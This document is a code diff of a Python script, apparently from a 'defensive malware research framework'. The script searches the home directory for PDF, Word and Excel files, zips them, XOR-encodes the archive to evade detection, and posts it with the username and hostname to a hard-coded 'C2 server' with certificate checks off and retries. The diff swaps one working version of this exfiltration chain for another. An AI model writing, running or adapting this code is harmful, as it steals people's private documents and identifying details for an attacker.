@@ -1,129 +1,150 @@
 #!/usr/bin/env python3
-"""Merged Modules for Defensive Malware Research Framework"""
-
-import sys
-import json
-import time
-import os
-import zlib
-import requests
-import socket
+import sys, json, time, os, requests, socket
 from typing import Dict, Any
 from pathlib import Path
 import shutil
+import zipfile
+import io
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
-    """Collect Sensitive Files"""
     start = time.time()
     input_data = input_data or {}
     try:
         # Define the file extensions to search for
         sensitive_extensions = ['.pdf', '.docx', '.xlsx']
-        # Define the staging directory
-        staging_dir = Path.home() / 'staging'
-        staging_dir.mkdir(parents=True, exist_ok=True)
-
         file_paths = []
         total_size = 0
 
-        # Enumerate files in the filesystem
-        for root in [Path.home()]:
-            try:
-                for file in root.rglob('*'):
-                    if file.suffix in sensitive_extensions and file.is_file():
-                        file_paths.append(str(file))
-                        total_size += file.stat().st_size
-                        # Copy file to staging directory
-                        shutil.copy(file, staging_dir / file.name)
-            except PermissionError:
-                # Skip directories where permission is denied
-                continue
+        # Define the root directory to start the search
+        root_directory = Path.home()
 
+        # Enumerate files with the specified extensions
+        for ext in sensitive_extensions:
+            for file_path in root_directory.rglob(f'*{ext}'):
+                try:
+                    if file_path.is_file():
+                        file_paths.append(str(file_path))
+                        total_size += file_path.stat().st_size
+                except PermissionError:
+                    # Skip directories/files that raise PermissionError
+                    continue
+
+        # Prepare the result
         result = {
             'file_paths': file_paths,
             'total_size': total_size
         }
+
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
-def xor_encode(data: bytes, key: bytes) -> bytes:
-    """XOR encode the data with the given key."""
-    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
-
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
-    """Compress and XOR-Encode Files for Exfiltration"""
     start = time.time()
     input_data = input_data or {}
     try:
         file_paths = input_data.get('file_paths', [])
         total_size = input_data.get('total_size', 0)
 
-        # Read and compress the files
-        compressed_data = b''
-        for file_path in file_paths:
-            with open(file_path, 'rb') as f:
-                compressed_data += zlib.compress(f.read())
+        # Create an in-memory bytes buffer to store the compressed data
+        compressed_buffer = io.BytesIO()
 
+        # Compress the files into a zip archive
+        with zipfile.ZipFile(compressed_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+            for file_path in file_paths:
+                if os.path.exists(file_path):
+                    zip_file.write(file_path, arcname=os.path.basename(file_path))
+
+        # Get the compressed data as bytes
+        compressed_data = compressed_buffer.getvalue()
+
+        # Convert bytes to hex string for JSON compatibility
+        result = {'compressed_data': compressed_data.hex()}
+
+        return {'success': True, 'data': result,
+                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
+    except Exception as e:
+        return {'success': False, 'error': f'{type(e).__name__}: {e}',
+                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
+
+def xor_encode(data: bytes, key: bytes) -> bytes:
+    """XOR encode the data with the given key."""
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
+    start = time.time()
+    input_data = input_data or {}
+    try:
+        # Retrieve compressed data
+        compressed_data = bytes.fromhex(input_data.get('compressed_data', ''))
+        
+        # Define a simple XOR key
+        xor_key = b'secretkey'
+        
         # XOR encode the compressed data
-        xor_key = b'secret_key'  # Example key, should be securely managed
         encoded_data = xor_encode(compressed_data, xor_key)
-
+        
+        # Prepare the result
         result = {
             'encoded_data': encoded_data.hex(),
             'encoding': 'xor'
         }
-
+        
         return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
+                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
+        # Return partial result on failure
+        return {'success': False, 'data': {'encoded_data': None, 'encoding': 'xor'},
+                'error': f'{type(e).__name__}: {e}',
+                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
-def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
-    """Exfiltrate Encoded Data to a C2 server over HTTPS via periodic POST requests"""
+def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
+        # Extract and decode the input data
         encoded_data = bytes.fromhex(input_data.get('encoded_data', ''))
         encoding = input_data.get('encoding', '')
-        
+
         # Prepare system information
-        username = os.environ.get('USERNAME', 'unknown')
+        username = os.getlogin()
         hostname = socket.gethostname()
-        
-        # Prepare payload
+
+        # Prepare the payload
         payload = {
-            'encoded_data': encoded_data.hex(),
+            'data': encoded_data.hex(),
             'encoding': encoding,
             'username': username,
             'hostname': hostname
         }
-        
-        # C2 server URL (example placeholder)
-        c2_url = "https://192.168.187.180/api"
-        
-        # Attempt to send data with retries
+
+        # C2 server URL
+        c2_url = "https://192.168.184.194/api"
+
+        # Attempt to send the data with retries
         attempts = 0
+        max_attempts = 3
+        response_code = None
         success = False
-        for _ in range(3):
+
+        while attempts < max_attempts:
             try:
-                response = requests.post(c2_url, json=payload, timeout=15, verify=False)
-                attempts += 1
-                if response.status_code == 200:
+                response = requests.post(c2_url, json=payload, timeout=10, verify=False)
+                response_code = response.status_code
+                if response.ok:
                     success = True
                     break
             except (requests.ConnectionError, requests.Timeout):
                 time.sleep(5)
-        
-        result = {'success': success, 'attempts': attempts}
-        return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
+            attempts += 1
+
+        return {'success': success, 'data': {'response_code': response_code},
+                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
     except Exception as e:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
+                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
 
 def main() -> dict:
     """Auto-generated orchestrator — do not edit by hand."""
@@ -150,16 +171,16 @@ def main() -> dict:
         results['T1'] = {'success': False, 'error': str(e)}
         return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
     
-    # ── T2: Compress and XOR-Encode Files [data-processing] ──
+    # ── T2: Compress Files [data-processing] ──
     try:
         r = task_T2(outputs.get('T1', {}))
         results['T2'] = r
         if r.get('success'):
             outputs['T2'] = r.get('data', {})
-            print(f'[+] T2 (Compress and XOR-Encode Files): OK')
+            print(f'[+] T2 (Compress Files): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T2 (Compress and XOR-Encode Files): FAILED — {err}')
+            print(f'[-] T2 (Compress Files): FAILED — {err}')
             failed.append('T2')
             print('[!] abort_mission — stopping')
             return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
@@ -169,25 +190,41 @@ def main() -> dict:
         results['T2'] = {'success': False, 'error': str(e)}
         return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
     
-    # ── T3: Exfiltrate Encoded Data [exfiltration] ──
+    # ── T3: XOR Encode Payload [defense-evasion] ──
     try:
         r = task_T3(outputs.get('T2', {}))
         results['T3'] = r
         if r.get('success'):
             outputs['T3'] = r.get('data', {})
-            print(f'[+] T3 (Exfiltrate Encoded Data): OK')
+            print(f'[+] T3 (XOR Encode Payload): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T3 (Exfiltrate Encoded Data): FAILED — {err}')
+            print(f'[-] T3 (XOR Encode Payload): FAILED — {err}')
             failed.append('T3')
-            r2 = task_T3(outputs.get('T2', {}))
-            if r2.get('success'):
-                outputs['T3'] = r2.get('data', {})
-                failed.remove('T3')
     except Exception as e:
         print(f'[!] T3 crashed: {e}')
         failed.append('T3')
         results['T3'] = {'success': False, 'error': str(e)}
+    
+    # ── T4: Exfiltrate Data to C2 Server [exfiltration] ──
+    try:
+        r = task_T4(outputs.get('T3', {}))
+        results['T4'] = r
+        if r.get('success'):
+            outputs['T4'] = r.get('data', {})
+            print(f'[+] T4 (Exfiltrate Data to C2 Server): OK')
+        else:
+            err = r.get('error', 'unknown')
+            print(f'[-] T4 (Exfiltrate Data to C2 Server): FAILED — {err}')
+            failed.append('T4')
+            r2 = task_T4(outputs.get('T3', {}))
+            if r2.get('success'):
+                outputs['T4'] = r2.get('data', {})
+                failed.remove('T4')
+    except Exception as e:
+        print(f'[!] T4 crashed: {e}')
+        failed.append('T4')
+        results['T4'] = {'success': False, 'error': str(e)}
     
     success = len(failed) == 0
     if success:
